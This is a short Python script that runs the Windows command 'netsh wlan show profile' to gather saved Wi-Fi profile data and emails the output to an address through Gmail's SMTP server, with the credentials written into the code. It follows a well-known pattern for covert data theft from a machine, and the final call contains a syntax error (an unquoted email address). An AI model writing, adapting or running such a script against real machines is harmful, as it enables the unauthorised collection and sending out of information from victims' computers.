#!/usr/bin/env python
import subprocess, smtplib, re

def send_mail(email, password, message):
#create google SMTP server and port 587 (google port for smtp)
    server = smtplib.SMTP("smtp.gmail.com", 587)
#init TLS connection for the SMTP server that was created above
    server.starttls()
#login method using email and password
    server.login(email, password)
#sendmail method to send from email, to self, using message
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
send_mail(name@gmail.com, "password123", result)
